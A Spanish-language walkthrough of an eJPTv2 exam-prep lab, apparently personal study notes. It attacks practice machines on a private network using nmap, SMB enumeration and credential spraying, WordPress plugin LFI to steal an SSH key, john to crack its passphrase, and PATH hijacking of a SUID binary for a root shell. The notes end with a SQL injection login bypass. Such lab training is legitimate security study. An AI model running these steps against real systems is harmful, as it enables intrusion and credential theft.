# Laboratorio de preparación eJPTv2 | Simulación de examen

{% embed url="https://youtu.be/v20IsEd5nUU?si=5v8wrsLm_pxpzXXj" %}

## Enumeración de red - Descubrimientos de hosts y escaneo de puertos

```bash
ip a
nmap -sn 10.0.2.0/24 #manda paquetes ICMP a ese segmento de red
sudo nmap -sS --min-rate 5000 -p- --open 10.0.2.43,45,46,53,55 -oN tcp_scan.txt
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
nmap --open -p135,139,22,25,45,445,49665,49670,80 -sC -sV 10.0.2.43,45,46,53,55 -Pn -On full_scan.txt
```

## Primera Máquina

Servicios vulnerables: 22,25,80,139 y 445.

Nos creamos una carpeta para la primera máquina.

```bash
mkdir 10.0.2.43
```

Entramos por el puerto 80 y vemos una imagen de un evento griego. Tampoco en el código fuente hay cosas relevantes. Hacemos por lo tanto hacemos fuerza bruta a directorios.

```
dirb http://10.0.2.43:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Por aquí no va el ataque. Ahora nos fijaremos en SMB.

```bash
smbclient -L 10.0.2.43 -N 
```

Como no vemos que permisos tenemos sobre esos recursos usamos este comando.

```bash
smbmap -H 10.0.2.43
crackmepexec smb 10.0.2.43 -u '' -p '' --shares
enum4linux 10.0.2.43
```

Realizamos conexón con el recurso anonymous.

```bash
smbclient //10.0.2.43/anonymous -N
```

Nos descargamos el archivo y nos creamos un archivo con las contraseñas mencionadas. También podemos listar usuarios.

```bash
crackmapexec smb 10.0.2.43 -u '' -p '' --users
```

Con las credenciales.

```bash
crackmapexec smb 10.0.2.43 -u helios -p passwords.txt 
```

Esas contraseñas no son válidas para el usuario helios.

```bash
smbmap -H 10.0.2.43 -u helios -p qwerty
```

Tenemos permisos a recursos que no teníamos antes.

```bash
smbclient //10.0.2.43/helios -U helios
```

Nos descargamos los archivos. Vemos que hemos encontrado una ruta oculta. Parece un WordPress por lo que añadimos el dominio al /etc/hosts.

```bash
10.0.2.43    symfonos.local
https://symfonos.local/h3l105/wp-admin
```

> Nota: también nos puede caer Drupal /drupscan) y Joomla (joomscan).

Enumeramos para el WordPress.

```bash
wpscan --url http://symfonos.local/h3l105 #nos enumera todo hasta plugins
```

Usamos searchsploit para ver los exploits de los plugins.

```bash
searchsploit wordpress mail masta
searchsploit site editor
```

Nos sale 3 exploits de masta.

```
searchsploit -m 40290 # nos lo traemos en la atacante
```

Vemos el contenido y encontramos una ruta por la que entramos en ella y descubrimos el /etc/passwd. Vamos a convertir LFI a RCE. Atentamos a la id\_rsa de los usuarios del sistema con la ruta anterior.

```bash
=/home/helios/.ssh/id_rsa
```

Tenemos la id\_rsa pero encriptada.

```bash
ssh helios@10.0.2.43
```

Se necesita la clave pública para iniciar sesión. Copiamos la id\_rsa el contenido y proporcionamos eso al inicio de sesión.

<pre><code>chmod 600 id_rsa
<strong>ssh -i id_rsa helios@10.0.2.43
</strong></code></pre>

Extraemos los hashes de la id\_rsa.

```bash
ssh2john id_rsa > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Encontramos la passphrase.

```bash
ssh -i id_rsa helios@10.0.2.43 #poner xerox
```

Estamos dentro de la máquina víctima. Revisamos.

```bash
sudo -l
cat /etc/crontab
find / -perm -4000 -ls 2>/dev/null
```

Hay uno que nos llama la atención.

```bash
/opt/statuscheck
```

Con la herramienta strings podemos ver caracteres legibles.

```
strings /opt/statuscheck
```

Vemos que hay un curl y lo está buscando en el PATH del sistema. Vamos a hacer un PATH Hijacking.

```bash
export PATH=/tmp:$PATH #ruta principal cambiada
cd /tmp
echo '/bin/bash -p' > curl
chmod +x curl
./curl #inicia una sesión anidada
/opt/statuscheck #en el momento que encuentre curl obtendremos una bash
```

## Segunda máquina

Servicios vulnerables: 80.

No se acceden a los recursos de forma correcta y comprobamos el código fuente y descubrimos un dominio con el que lo añadimos a /etc/hosts.

```bash
10.0.2.53    doc.hmv
```

Enumeramos directorios.

```
nikto -url http://doc.hmv
```

En el panel de Login.

```
' OR==1-- -'
```
